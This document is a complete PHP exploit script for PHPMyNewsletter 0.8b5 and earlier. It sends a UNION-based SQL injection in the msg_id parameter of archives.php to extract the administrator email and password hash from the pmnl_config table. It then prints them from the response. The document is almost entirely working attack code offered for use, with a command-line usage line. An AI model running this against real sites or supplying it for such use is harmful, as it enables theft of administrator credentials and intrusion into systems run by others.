#!/usr/bin/php
&lt;?php
/*
 * Name:    PHPMyNewsletter &lt;= 0.8b5 SQL Injection
 * Credits: Charles &quot;real&quot; F. &lt;charlesfol[at]hotmail.fr&gt;
 * Date:    03-10-08
 * Conditions: magic_quotes_gpc=Off
 *
 * This exploit gets admin_pass and admin_email from pmnl_config.
 */
 
print &quot;\n&quot;;
print &quot;   PHPMyNewsletter &lt;= 0.8b5 SQL Injection\n&quot;;
print &quot;       by real &lt;charlesfol[at]hotmail.fr&gt;\n\n&quot;;
 
if($argc&lt;2) die(&quot;usage: php phpmynewsletter_sql.php &lt;url&gt;\n&quot;);
$url  = $argv[1];

$c = get($url.&quot;archives.php?msg_id=&#039;%20UNION%20SELECT%201,1,admin_email,admin_pass%20%20FROM%20pmnl_config%2f%2a&amp;list_id=1&quot;);

if(preg_match(&quot;#&lt;div class=&#039;archivetitle&#039;&gt;(.+) - 0000-00-00 00:00:00&lt;/div&gt;#i&quot;,$c,$a) &amp;&amp; preg_match(&quot;#&lt;div class=&#039;subcontent&#039;&gt;\t([a-f0-9]{32})&lt;/div&gt;&lt;/div&gt;#i&quot;,$c,$b))
{
	print &quot;[*] Mail:\t$a[1]\n&quot;;
	print &quot;[*] Password:\t$b[1]\n&quot;;
}
else
{
	print &quot;[*] Exploit failed\n&quot;;
}

function get($url,$get=1)
{
	$result = &#039;&#039;;
	preg_match(&quot;#^http://([^/]+)(/.*)$#i&quot;,$url,$infos);
	$host = $infos[1];
	$page = $infos[2];
	$fp = fsockopen($host, 80, &amp;$errno, &amp;$errstr, 30);
	
	$req  = &quot;GET $page HTTP/1.1\r\n&quot;;
	$req .= &quot;Host: $host\r\n&quot;;
	$req .= &quot;User-Agent: Mozilla Firefox\r\n&quot;;
	$req .= &quot;Connection: close\r\n\r\n&quot;;

	fputs($fp,$req);
	
	if($get) while(!feof($fp)) $result .= fgets($fp,128);
	
	fclose($fp);
	return $result;
}

?&gt;
